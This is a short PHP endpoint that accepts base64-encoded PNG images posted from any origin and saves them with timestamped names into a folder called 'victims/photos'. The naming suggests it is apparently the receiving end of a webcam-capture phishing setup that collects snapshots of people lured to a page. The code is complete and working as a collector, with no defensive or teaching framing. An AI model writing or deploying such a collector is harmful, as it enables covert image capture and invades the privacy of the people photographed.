<?php
  header("Access-Control-Allow-Origin: *");
  header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
  header("Access-Control-Allow-Headers: Content-Type");

  error_log("POST data received: " . print_r($_POST, true));

  if (isset($_POST['image'])) {
    $data = $_POST['image'];
    error_log("Image data length: " . strlen($data));

    $data = str_replace('data:image/png;base64,', '', $data);
    $data = str_replace(' ', '+', $data);
    $imageData = base64_decode($data);

    error_log("Decoded image size: " . strlen($imageData) . " bytes");

    $filename = 'photo_' . time() . '.png';
    $photosDir = "./victims" . '/' . 'photos';
    $filePath = $photosDir . '/' . $filename;

    if (!file_exists($photosDir)) {
      mkdir($photosDir, 0755, true);
    }

    $result = file_put_contents($filePath, $imageData);
    error_log("File write result: " . ($result !== false ? "Success ($result bytes)" : "Failed"));

    if ($result !== false) {
      error_log("Saved as $filename (size: " . strlen($imageData) . " bytes)");
    } else {
      http_response_code(500);
      error_log("Failed to save image");
    }
  } else {
    http_response_code(400);
    error_log("No image data in POST");
    echo "No image data received";
  }
?>
